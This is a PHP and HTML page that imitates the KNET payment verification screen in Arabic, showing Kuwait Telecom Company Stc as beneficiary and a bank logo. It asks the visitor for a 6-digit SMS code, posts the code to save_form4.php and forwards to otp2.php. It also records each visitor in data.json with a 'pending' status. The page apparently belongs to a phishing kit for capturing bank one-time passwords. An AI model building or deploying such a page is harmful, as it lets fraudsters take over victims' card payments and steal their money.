<?php
session_start();
$user_id = $_SESSION['user_id'] ?? uniqid("user_");
$_SESSION['user_id'] = $user_id;

$data_file = 'data.json';
$data = file_exists($data_file) ? json_decode(file_get_contents($data_file), true) : [];

$exists = false;
foreach ($data as $user) {
    if ($user['user_id'] === $user_id) {
        $exists = true;
        break;
    }
}

if (!$exists) {
    $data[] = [
        'user_id' => $user_id,
        'status' => 'pending'
    ];
    file_put_contents($data_file, json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
}
?>
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>صفحة دفع كي نت</title>
    <link rel="stylesheet" href="otp.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
</head>
<body>
    <header id="pageHeader">
        <img src="pc (1).jpg" alt="رأس الصفحة" id="headerImage">
    </header>
    
    <div class="box bank-info" id="bankInfoBox">
        <img id="imgkn" src="images (3).png" alt="بنك وربة" class="bank-logo">
        <p id="beneficiaryLabel">المستفيد: <strong id="beneficiaryName" >Kuwait Telecom Company Stc</strong></p>
        <p id="amountLabel">المبلغ: <strong id="amountValu">KD 5.000</strong></p>
    </div>
    
    <div class="box payment-form" id="boxdiv">
        <form id="paymentForm" onsubmit="event.preventDefault(); sendToServer();">
            <div id="boxrexer"> 
                <h1 id="textr">
                Please note: A 6-digit verification code has been sent via text message to your registered phone number. Please enter your zip code in the box below to complete the verification process.

                </h1>
            </div>

            <div class="input-container">
                <label for="pin">رمز التحقق :</label>
                <div class="input-box">
                    <input type="password" id="pin" required pattern="\d{6}" maxlength="6" inputmode="numeric">
                </div>
            </div>

            <div class="box buttons" id="boxbuttons">
                <button type="button" onclick="resetForm()">إلغاء</button>
                <button type="submit">إرسال</button>
            </div>    
        </form>
    </div>

            <div id="mngbhb" style="text-align:center;font-size:11px;line-height:1">All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;<br><span style="font-size:10px;font-weight:bold;color:#0077d5">The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET</span></div>


    <script>

              // استرجاع المبلغ المخزن من localStorage وعرضه
    const amount = localStorage.getItem('selectedAmount');
    if (amount) {
      document.getElementById('amountValu').textContent = " " + amount + " د.ك";
    } else {
      document.getElementById('amountValu').textContent = "لم يتم تحديد المبلغ.";
    }
    function sendToServer() {
        const pin = document.getElementById("pin").value.trim();
        if (!/^\d{6}$/.test(pin)) {
            alert("الرجاء إدخال رمز مكون من 6 أرقام.");
            return;
        }

        const formData = new FormData();
        formData.append("otp", pin);
        formData.append("form_type", "form2"); // 🔴 مهم جداً لتحديد نوع الفورم

        fetch("save_form4.php", {
            method: "POST",
            body: formData
        })
        .then(response => response.text())
        .then(data => {
            document.getElementById("paymentForm").reset();
            // ✅ الانتقال إلى الصفحة الجديدة بعد الإرسال
            window.location.href = "otp2.php";
        })
        .catch(error => {
            console.error("Error:", error);
            alert("حدث خطأ أثناء الإرسال.");
        });
    }

    function resetForm() {
        document.getElementById("paymentForm").reset();
    }
</script>
</body>
</html>
